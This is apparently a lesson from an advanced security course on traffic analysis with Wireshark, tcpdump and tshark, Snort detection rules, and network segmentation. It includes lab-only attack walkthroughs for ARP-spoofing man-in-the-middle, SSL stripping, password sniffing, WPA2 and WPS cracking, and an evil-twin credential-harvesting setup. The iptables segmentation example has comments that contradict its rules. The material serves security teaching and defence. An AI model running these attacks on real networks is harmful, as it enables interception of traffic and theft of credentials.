# 24 — Network Security and Traffic Analysis

> **Security Advanced · Module 4** | Difficulty: ★★★★☆ Advanced | Time: ~120 min

---

## Learning Objectives

- Analyze network traffic with Wireshark and tcpdump
- Detect network attacks in packet captures
- Implement network segmentation
- Configure intrusion detection/prevention systems
- Understand wireless security and attacks
- Perform man-in-the-middle attacks (lab only)

---

## 1. Wireshark Deep Dive

```bash
# Install Wireshark
sudo apt install wireshark
sudo usermod -aG wireshark $USER   # allow non-root capture
newgrp wireshark
```

### Essential Wireshark Filters

```
# Basic filters
ip.addr == 192.168.1.100       # traffic from/to IP
ip.src == 192.168.1.100        # traffic FROM IP
ip.dst == 192.168.1.100        # traffic TO IP
tcp.port == 80                 # traffic on port 80
tcp.dstport == 443             # traffic TO port 443
http                           # HTTP only
dns                            # DNS only
ftp                            # FTP only
ssh                            # SSH only

# Filter by protocol
tcp                            # all TCP
udp                            # all UDP
icmp                           # all ICMP
arp                            # ARP packets

# HTTP filters
http.request.method == "POST"  # POST requests
http.response.code == 200      # 200 responses
http.contains "password"       # HTTP containing "password"
http.host == "example.com"     # requests to specific host

# Combine filters
ip.addr == 192.168.1.1 && tcp.port == 80
http || dns
not arp                        # exclude ARP

# TCP flags
tcp.flags.syn == 1             # SYN packets
tcp.flags.ack == 1 && tcp.flags.syn == 0  # ACK only
tcp.flags.rst == 1             # RST packets
tcp.flags.fin == 1             # FIN packets
tcp.flags == 0x002             # SYN only
tcp.flags == 0x012             # SYN-ACK
```

### Reconstructing Traffic

```
Wireshark → right-click on HTTP stream → Follow → TCP Stream
→ Shows full request/response in plaintext

Wireshark → File → Export Objects → HTTP
→ Extract files transferred over HTTP

Wireshark → Statistics → Protocol Hierarchy
→ See breakdown of protocols
```

---

## 2. tcpdump for Capture and Analysis

```bash
# Capture on interface
sudo tcpdump -i eth0                          # capture all
sudo tcpdump -i eth0 -w /tmp/capture.pcap    # save to file
sudo tcpdump -r capture.pcap                  # read saved

# Filters (BPF syntax)
sudo tcpdump -i eth0 host 192.168.1.100       # specific host
sudo tcpdump -i eth0 port 80                  # specific port
sudo tcpdump -i eth0 tcp port 443             # TCP 443
sudo tcpdump -i eth0 'tcp port 80 or tcp port 443'  # OR
sudo tcpdump -i eth0 not port 22              # exclude SSH

# Display options
sudo tcpdump -i eth0 -n                       # don't resolve DNS
sudo tcpdump -i eth0 -nn                      # no DNS/port resolution
sudo tcpdump -i eth0 -X                       # hex + ASCII dump
sudo tcpdump -i eth0 -A                       # ASCII only
sudo tcpdump -i eth0 -v                       # verbose
sudo tcpdump -i eth0 -vvv                     # very verbose

# Common security captures
sudo tcpdump -i eth0 port 4444               # catch reverse shells
sudo tcpdump -i eth0 'tcp[tcpflags] == tcp-syn'  # SYN scan detection
sudo tcpdump -i eth0 icmp                     # ICMP (ping)
sudo tcpdump -i eth0 arp                      # ARP (spoofing detection)

# Extract HTTP requests
sudo tcpdump -i eth0 -A 'tcp port 80' | grep -E "GET|POST|Host:"
```

---

## 3. Detecting Network Attacks in PCAPs

### Port Scan Detection

```bash
# Identify port scanning in a capture
tshark -r capture.pcap -z io,phs    # protocol hierarchy statistics

# SYN scan: many SYN packets to different ports, no completion
tshark -r capture.pcap -Y 'tcp.flags.syn==1 && tcp.flags.ack==0' | \
    awk '{print $3}' | sort | uniq -c | sort -rn | head -10

# UDP scan: many UDP packets with ICMP port unreachable replies
tshark -r capture.pcap -Y 'icmp.type==3 && icmp.code==3'
```

### ARP Spoofing Detection

```bash
# ARP spoofing sends fake ARP replies, associating attacker's MAC with target IP

# Detect duplicate IPs with different MACs
tshark -r capture.pcap -Y 'arp' -T fields -e arp.src.proto_ipv4 -e arp.src.hw_mac | \
    sort | uniq | awk '{print $1}' | sort | uniq -d

# Wireshark will highlight these as "duplicate IP address detected"
```

### Password Sniffing

```bash
# Extract FTP credentials from capture
tshark -r capture.pcap -Y 'ftp' -T fields -e ftp.request.command -e ftp.request.arg

# Extract HTTP Basic Auth
tshark -r capture.pcap -Y 'http.authorization' -T fields -e http.authorization

# Extract telnet data
tshark -r capture.pcap -Y 'telnet' -T fields -e telnet.data | tr -d '\n'

# Look for credentials in HTTP POST
tshark -r capture.pcap -Y 'http.request.method==POST' -T fields \
    -e ip.src -e http.host -e http.request.uri -e http.file_data
```

---

## 4. Man-in-the-Middle Attacks (Lab Only!)

### ARP Spoofing with Bettercap

```bash
# Install bettercap
sudo apt install bettercap

# Launch bettercap
sudo bettercap -iface eth0

# In bettercap console:
net.probe on              # discover hosts
net.show                  # show discovered hosts

# ARP spoof between target and gateway
set arp.spoof.targets 192.168.1.100    # target
set arp.spoof.fullduplex true           # spoof both directions
arp.spoof on

# Enable packet capture
net.sniff on

# HTTP/HTTPS downgrade (strips SSL)
# WARNING: Will be detected by modern browsers (HSTS)
set https.proxy.sslstrip true
https.proxy on
```

### ARP Spoofing with arpspoof

```bash
sudo apt install dsniff

# Enable IP forwarding (to forward traffic after intercepting)
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# ARP spoof: tell target that gateway MAC = our MAC
sudo arpspoof -i eth0 -t TARGET_IP GATEWAY_IP

# In another terminal: tell gateway that target MAC = our MAC
sudo arpspoof -i eth0 -t GATEWAY_IP TARGET_IP

# Now all traffic flows through you!
# Use tcpdump/Wireshark to capture it
sudo tcpdump -i eth0 -A host TARGET_IP | grep -i "password\|user\|login"
```

---

## 5. Wireless Security

### WPA2 Handshake Capture

```bash
sudo apt install aircrack-ng

# Set wireless card to monitor mode
sudo airmon-ng check kill     # kill conflicting processes
sudo airmon-ng start wlan0    # creates wlan0mon

# Scan for networks
sudo airodump-ng wlan0mon

# Target a specific network
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF \
    --channel 6 \
    --write /tmp/capture \
    wlan0mon

# Deauthenticate a client (force handshake)
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon
# This sends deauth packets; client reconnects and you capture handshake

# Crack with aircrack-ng
aircrack-ng /tmp/capture-01.cap -w /usr/share/wordlists/rockyou.txt

# Convert for hashcat (faster cracking)
hcxpcapngtool -o hash.hc22000 /tmp/capture-01.cap
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt

# Stop monitor mode
sudo airmon-ng stop wlan0mon
sudo systemctl start NetworkManager
```

### WPS Attack (Pixie Dust)

```bash
sudo apt install reaver bully

# Scan for WPS-enabled APs
sudo wash -i wlan0mon

# Reaver WPS brute force
sudo reaver -i wlan0mon -b AP_MAC -vv

# Pixie dust attack (faster, if vulnerable)
sudo reaver -i wlan0mon -b AP_MAC -vv -K 1
```

### Evil Twin Attack

```bash
# Create rogue AP mimicking a legitimate one
sudo apt install hostapd-wpe

# hostapd configuration
cat << 'EOF' > /tmp/hostapd.conf
interface=wlan0
ssid=FreeWiFi
hw_mode=g
channel=6
auth_algs=1
ignore_broadcast_ssid=0
EOF

# Combined with captive portal for credential harvesting
sudo apt install dnsmasq
# Configure to redirect all DNS to your server
# Serve a fake login page
```

---

## 6. Network Segmentation

```bash
# Implement proper network segmentation with iptables

# Allow traffic within segments
sudo iptables -A FORWARD -i eth1 -o eth2 -j ACCEPT  # DMZ → Internal: BLOCK
sudo iptables -A FORWARD -i eth2 -o eth1 -j DROP     # Internal → DMZ: Allow limited

# VLANs for segmentation
# Management VLAN: 10.0.10.0/24
# Users VLAN: 10.0.20.0/24
# Servers VLAN: 10.0.30.0/24
# DMZ VLAN: 10.0.40.0/24

# Restrict inter-VLAN routing
# Only allow necessary traffic between VLANs
```

---

## 7. Intrusion Detection with Snort

```bash
sudo apt install snort

# Test Snort configuration
sudo snort -T -c /etc/snort/snort.conf

# Run Snort as IDS
sudo snort -A console -c /etc/snort/snort.conf -i eth0

# Write custom rules
cat << 'EOF' | sudo tee /etc/snort/rules/local.rules
# Detect port scans
alert tcp any any -> $HOME_NET any (msg:"Port Scan Detected"; flags:S; threshold:type both, track by_src, count 20, seconds 3; sid:1000001;)

# Detect SQL injection attempts
alert tcp any any -> $HOME_NET 80 (msg:"SQL Injection Attempt"; content:"UNION SELECT"; nocase; sid:1000002;)

# Detect reverse shell
alert tcp $HOME_NET any -> any 4444 (msg:"Potential Reverse Shell"; sid:1000003;)

# Detect nmap scan
alert tcp any any -> $HOME_NET any (msg:"NMAP SYN Scan"; flags:S; threshold:type both, track by_src, count 30, seconds 5; sid:1000004;)
EOF

sudo snort -A console -c /etc/snort/snort.conf -i eth0
```

---

## Practice Exercises

### Exercise 24.1 — PCAP Analysis

```bash
# Download a sample PCAP
wget https://wiki.wireshark.org/SampleCaptures -O /tmp/samples.html
# Or use a CTF PCAP challenge

# Questions to answer:
# 1. What IP addresses communicated most?
tshark -r capture.pcap -q -z conv,ip | head -20

# 2. What protocols were used?
tshark -r capture.pcap -q -z io,phs

# 3. Were any credentials transmitted in cleartext?
tshark -r capture.pcap -Y 'http.request.method==POST' -T fields -e http.file_data

# 4. Any signs of scanning?
tshark -r capture.pcap -Y 'tcp.flags.syn==1 && tcp.flags.ack==0' | wc -l
```

### Exercise 24.2 — Network Capture Analysis

```bash
# Generate traffic for analysis
# 1. Start capture
sudo tcpdump -i lo -w /tmp/test_capture.pcap &

# 2. Generate HTTP traffic
curl http://httpbin.org/get
curl -X POST http://httpbin.org/post -d "username=test&password=secret123"

# 3. Stop capture
kill %1

# 4. Analyze the capture
tshark -r /tmp/test_capture.pcap -Y 'http' -T fields \
    -e ip.src -e http.request.method -e http.request.uri
```

---

## Key Takeaways

- **Wireshark filters** narrow down traffic; **TCP stream following** reconstructs sessions
- **tcpdump** captures traffic efficiently; **tshark** provides CLI analysis
- **ARP spoofing** enables MITM attacks — detect with duplicate MAC/IP alerts
- Unencrypted protocols (FTP, Telnet, HTTP) leak credentials in plaintext
- **WPA2 cracking** requires capturing the 4-way handshake then offline cracking
- **Snort/Suricata** rules can detect port scans, injection attempts, and reverse shells
- Network segmentation with VLANs limits lateral movement after compromise
- Always use **encrypted protocols**: HTTPS, SSH, SFTP, SMTPS — never FTP, Telnet, HTTP

---

➡️ [25 — Active Directory and Windows Attacks](25_Active_Directory_Windows_Attacks.md)

*Security Advanced · Lesson 4 of 8 | [Course Index](../INDEX.md)*
